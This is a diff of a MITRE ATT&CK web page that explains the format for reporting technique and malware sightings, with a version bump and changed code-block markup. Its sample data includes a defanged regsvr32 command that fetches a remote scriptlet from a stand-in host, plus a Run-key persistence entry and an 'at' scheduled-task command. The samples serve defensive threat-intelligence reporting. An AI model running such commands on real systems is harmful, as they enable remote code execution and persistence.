@@ -137,9 +137,9 @@
             <!-- banner elements -->
             <div class="col px-0">
                 <!-- don't edit or remove the line below even though it's commented out, it gets parsed and replaced by the versioning feature -->
-                <div class="container-fluid version-banner"><div class="icon-inline baseline mr-1"><img src="/versions/v11/theme/images/icon-warning-24px.svg"></div>Currently viewing <a href="https://github.com/mitre/cti/releases/tag/ATT%26CK-v11.0" target="_blank">ATT&CK v11.0</a> which is the current version of ATT&CK. <a href="/resources/versions/">Learn more about the versioning system</a> or <a href="/">see the live site</a>.</div>
+                <div class="container-fluid version-banner"><div class="icon-inline baseline mr-1"><img src="/versions/v11/theme/images/icon-warning-24px.svg"></div>Currently viewing <a href="https://github.com/mitre/cti/releases/tag/ATT%26CK-v11.1" target="_blank">ATT&CK v11.1</a> which is the current version of ATT&CK. <a href="/resources/versions/">Learn more about the versioning system</a> or <a href="/">see the live site</a>.</div>
                     <div class="container-fluid d-none">
-                        The new <a href='https://attack.mitre.org/resources/updates/updates-april-2022/'>v11.0 release of MITRE ATT&CK</a> contains a <a href='https://attack.mitre.org/matrices/mobile/'>beta version of Sub-Techniques for Mobile</a>. The current, stable Mobile content can be accessed via the <a href='https://attack.mitre.org/versions/v10/matrices/mobile/'>v10 release URL</a>.
+                        The new <a href='https://attack.mitre.org/resources/updates/updates-april-2022/'>v11.1 release of MITRE ATT&CK</a> contains a <a href='https://attack.mitre.org/matrices/mobile/'>beta version of Sub-Techniques for Mobile</a>. The current, stable Mobile content can be accessed via the <a href='https://attack.mitre.org/versions/v10/matrices/mobile/'>v10 release URL</a>.
                     </div>
             </div>
         </div>
@@ -179,7 +179,7 @@
 <p>Direct technique sightings are reported using the <a href="#direct-technique-sighting">direct-technique-sighting</a> format.</p>
 <h4>Direct sighting of malicious software</h4>
 <p>In some cases, a technique might not be directly observed (or even be observable given sensing capability) but the presence of a piece of malicious software on the machine can give a strong hint that it was used. In other cases, software to carry out a technique might be blocked at the perimeter – in those cases, it indicates that the adversary might have wanted to use a certain technique but wasn't able to.</p>
-<p><em>Note: There is of course a grey area when talking about malicious software. What we mean is tools that can be used to carry out malicious attacks, including things commonly called "penetration test" software as well as those that are clearly malicious. On the other hand, we don't mean built-in OS functionality. So please <strong>do</strong> send us sightings of things like metasploit or cobalt strike, but <strong>do not</strong> send us sightings of powershell or the net command. Those latter items should be reported as a direct sighting of a technique (e.g., T1086).</em></p>
+<p><em>Note: There is of course a grey area when talking about malicious software. What we mean is tools that can be used to carry out malicious attacks, including things commonly called "penetration test" software as well as those that are clearly malicious. On the other hand, we don't mean built-in OS functionality. So please </em><em>do</em><em> send us sightings of things like metasploit or cobalt strike, but </em><em>do not</em><em> send us sightings of powershell or the net command. Those latter items should be reported as a direct sighting of a technique (e.g., T1086).</em></p>
 <p><strong>Example</strong>: The presence of mimikatz.exe on a machine without evidence that it was actually run to dump credentials – or, mimikatz.exe being blocked at the perimeter or by antimalware -- would constitute a direct sighting of mimikatz. From that, you can assume some attempt to perform credential access techniques available in mimikatz -- but because they were not directly observed, you can't be certain exactly what did or could have happened.</p>
 <p>Note that direct software sightings are most useful for <a href="https://attack.mitre.org/software/">software already contained in ATT&amp;CK</a> that directly enables one or more ATT&amp;CK techniques.</p>
 <p>Direct software sightings are reported using the <a href="#direct-software-sighting">direct-software-sighting</a> format.</p>
@@ -476,94 +476,89 @@
 <p>Each object in the list of raw data should consist of an object from the <a href="https://car.mitre.org/data_model/">CAR data model</a> in the form "object.action": {"field": "value"}.</p>
 <p>For example:</p>
 <p><strong>Command Line</strong>:</p>
-<div class="highlight"><pre><span></span><span class="err">&quot;process.create&quot;: {&quot;command_line&quot;: &quot;regsvr32.exe /i:hxxp://lolbad.com scrobj.dll&quot;}</span>
-</pre></div>
-
+<div class="highlight"><pre><span></span><code><span class="s">&quot;process.create&quot;</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="s">&quot;command_line&quot;</span><span class="o">:</span><span class="w"> </span><span class="s">&quot;regsvr32.exe /i:hxxp://lolbad.com scrobj.dll&quot;</span><span class="p">}</span><span class="w"></span>
+</code></pre></div>
 
 <p><strong>Registry Key</strong>:</p>
-<div class="highlight"><pre><span></span><span class="err">&quot;registry.add&quot;: {</span>
-<span class="err">    &quot;hive&quot;: &quot;HKEY_CURRENT_USER&quot;,</span>
-<span class="err">    &quot;key&quot;: &quot;\Software\Microsoft\Windows\CurrentVersion\Run&quot;,</span>
-<span class="err">    &quot;value&quot;: &quot;bad.exe&quot;</span>
-<span class="err">}</span>
-</pre></div>
-
+<div class="highlight"><pre><span></span><code><span class="s">&quot;registry.add&quot;</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="s">&quot;hive&quot;</span><span class="o">:</span><span class="w"> </span><span class="s">&quot;HKEY_CURRENT_USER&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="s">&quot;key&quot;</span><span class="o">:</span><span class="w"> </span><span class="s">&quot;\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="s">&quot;value&quot;</span><span class="o">:</span><span class="w"> </span><span class="s">&quot;bad.exe&quot;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
 
 <p>More complete examples are also below. If something isn't expressible in the CAR data model as-is, just make up and object and action that makes sense to you and we'll figure it out.
 <br><br></p>
 <h2>Examples</h2>
 <h4>Simple Technique Sighting</h4>
 <p>A managed service provider monitors sensor data across its customer base. During that monitoring, an analytic flags a Sysmon process event that indicates a scheduled task is being created using "at".</p>
-<div class="highlight"><pre><span></span><span class="err">{</span>
-<span class="err">  &quot;id&quot;: &quot;DT-1234&quot;,</span>
-<span class="err">  &quot;sightingType&quot;: &quot;direct-technique-sighting&quot;,</span>
-<span class="err">  &quot;startTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,</span>
-<span class="err">  &quot;endTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,</span>
-<span class="err">  &quot;detectionType&quot;: &quot;human-validated&quot;,</span>
-<span class="err">  &quot;techniques&quot;: [</span>
-<span class="err">    {</span>
-<span class="err">      &quot;techniqueID&quot;: &quot;T1088&quot;,</span>
-<span class="err">      &quot;startTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,</span>
-<span class="err">      &quot;endTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,</span>
-<span class="err">      &quot;platform&quot;: &quot;Windows 10&quot;,</span>
-<span class="err">      &quot;rawData&quot;: [</span>
-<span class="err">        &quot;process.create&quot;: {&quot;command_line&quot;: &quot;at 13:30 /interactive cmd&quot;}</span>
-<span class="err">      ]</span>
-<span class="err">    }</span>
-<span class="err">  ]</span>
-<span class="err">}</span>
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>{
+  &quot;id&quot;: &quot;DT-1234&quot;,
+  &quot;sightingType&quot;: &quot;direct-technique-sighting&quot;,
+  &quot;startTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,
+  &quot;endTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,
+  &quot;detectionType&quot;: &quot;human-validated&quot;,
+  &quot;techniques&quot;: [
+    {
+      &quot;techniqueID&quot;: &quot;T1088&quot;,
+      &quot;startTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,
+      &quot;endTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,
+      &quot;platform&quot;: &quot;Windows 10&quot;,
+      &quot;rawData&quot;: [
+        &quot;process.create&quot;: {&quot;command_line&quot;: &quot;at 13:30 /interactive cmd&quot;}
+      ]
+    }
+  ]
+}
+</code></pre></div>
 
 <h4>Technique Sighting with Attribution</h4>
 <p>An ISAC collects, anonymizes, and redistributes sightings from its members. While it doesn’t receive the raw data, it does have demographic and (sometimes) attribution information.</p>
-<div class="highlight"><pre><span></span><span class="err">{</span>
-<span class="err">  &quot;id&quot;: &quot;1000&quot;,</span>
-<span class="err">  &quot;sightingType&quot;: &quot;direct-technique-sighting&quot;,</span>
-<span class="err">  &quot;startTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,</span>
-<span class="err">  &quot;endTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,</span>
-<span class="err">  &quot;detectionType&quot;: &quot;human-validated&quot;,</span>
-<span class="err">  &quot;sectors&quot;: [&quot;finance&quot;],</span>
-<span class="err">  &quot;attributionType&quot;: &quot;group&quot;,</span>
-<span class="err">  &quot;attribution&quot;: &quot;FIN7&quot;,</span>
-<span class="err">  &quot;techniques&quot;: [</span>
-<span class="err">    {</span>
-<span class="err">      &quot;techniqueID&quot;: &quot;T1003&quot;,</span>
-<span class="err">      &quot;startTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,</span>
-<span class="err">      &quot;endTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,</span>
-<span class="err">      &quot;platform&quot;: &quot;Windows 10 Enterprise&quot;</span>
-<span class="err">    }</span>
-<span class="err">  ]</span>
-<span class="err">}</span>
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>{
+  &quot;id&quot;: &quot;1000&quot;,
+  &quot;sightingType&quot;: &quot;direct-technique-sighting&quot;,
+  &quot;startTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,
+  &quot;endTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,
+  &quot;detectionType&quot;: &quot;human-validated&quot;,
+  &quot;sectors&quot;: [&quot;finance&quot;],
+  &quot;attributionType&quot;: &quot;group&quot;,
+  &quot;attribution&quot;: &quot;FIN7&quot;,
+  &quot;techniques&quot;: [
+    {
+      &quot;techniqueID&quot;: &quot;T1003&quot;,
+      &quot;startTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,
+      &quot;endTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,
+      &quot;platform&quot;: &quot;Windows 10 Enterprise&quot;
+    }
+  ]
+}
+</code></pre></div>
 
 <h4>Malware Blocked by Security Tool</h4>
 <p>A large end-user organization is running an anti-malware service that blocks execution of a Mac malware already in ATT&amp;CK.</p>
-<div class="highlight"><pre><span></span><span class="err">{</span>
-<span class="err">  &quot;id&quot;: &quot;32&quot;,</span>
-<span class="err">  &quot;sightingType&quot;: &quot;direct-malware-sighting&quot;,</span>
-<span class="err">  &quot;startTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,</span>
-<span class="err">  &quot;endTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,</span>
-<span class="err">  &quot;detectionType&quot;: &quot;raw&quot;,</span>
-<span class="err">  &quot;sectors&quot;: [&quot;healthcare&quot;],</span>
-<span class="err">  &quot;software&quot;: &quot;MacSpy&quot;</span>
-<span class="err">}</span>
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>{
+  &quot;id&quot;: &quot;32&quot;,
+  &quot;sightingType&quot;: &quot;direct-malware-sighting&quot;,
+  &quot;startTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,
+  &quot;endTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,
+  &quot;detectionType&quot;: &quot;raw&quot;,
+  &quot;sectors&quot;: [&quot;healthcare&quot;],
+  &quot;software&quot;: &quot;MacSpy&quot;
+}
+</code></pre></div>
 
 <h4>IOC Submission</h4>
 <p>A TIP vendor submits a set of IOCs that have been identified with ATT&amp;CK techniques.</p>
-<div class="highlight"><pre><span></span><span class="err">{</span>
-<span class="err">  &quot;id&quot;: &quot;32&quot;,</span>
-<span class="err">  &quot;sightingType&quot;: &quot;indirect-malware-sighting&quot;,</span>
-<span class="err">  &quot;startTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,</span>
-<span class="err">  &quot;endTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,</span>
-<span class="err">  &quot;sectors&quot;: [&quot;healthcare&quot;],</span>
-<span class="err">  &quot;software&quot;: &quot;RemCom&quot;,</span>
-<span class="err">  &quot;ioc&quot;: &quot;&lt;some hash&gt;&quot;</span>
-<span class="err">} </span>
-</pre></div>
+<div class="highlight"><pre><span></span><code>{
+  &quot;id&quot;: &quot;32&quot;,
+  &quot;sightingType&quot;: &quot;indirect-malware-sighting&quot;,
+  &quot;startTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,
+  &quot;endTime&quot;: &quot;2019-01-01T08:12:00Z&quot;,
+  &quot;sectors&quot;: [&quot;healthcare&quot;],
+  &quot;software&quot;: &quot;RemCom&quot;,
+  &quot;ioc&quot;: &quot;&lt;some hash&gt;&quot;
+} 
+</code></pre></div>
             </div>
         </div>
     </div>
@@ -625,7 +620,7 @@
                                 </div>
                                 <div class="col  text-left ">
                                     <small>
-                                        <a href="/versions/v11/resources/changelog.html" class="footer-link" data-toggle="tooltip" data-placement="top" data-html="true" title="ATT&amp;CK content v11.0&#013;Website  v3.6.0">ATT&CK v11.0</a>
+                                        <a href="/versions/v11/resources/changelog.html" class="footer-link" data-toggle="tooltip" data-placement="top" data-html="true" title="ATT&amp;CK content v11.1&#013;Website  v3.6.1">ATT&CK v11.1</a>
                                     </small>
                                 </div>
             
@@ -664,10 +659,10 @@
     <script src="/versions/v11/theme/scripts/popper.min.js"></script>
     <script src="/versions/v11/theme/scripts/bootstrap-select.min.js"></script>
     <script src="/versions/v11/theme/scripts/bootstrap.bundle.min.js"></script>
-    <script src="/versions/v11/theme/scripts/site.js?5732"></script>
+    <script src="/versions/v11/theme/scripts/site.js?2589"></script>
     <script src="/versions/v11/theme/scripts/flexsearch.es5.js"></script> 
     <script src="/versions/v11/theme/scripts/localforage.min.js"></script>
-    <script src="/versions/v11/theme/scripts/settings.js?944"></script>
+    <script src="/versions/v11/theme/scripts/settings.js?4338"></script>
     <script src="/versions/v11/theme/scripts/search_babelized.js"></script>
 
 <script src="/versions/v11/theme/scripts/tables.js"></script></body>
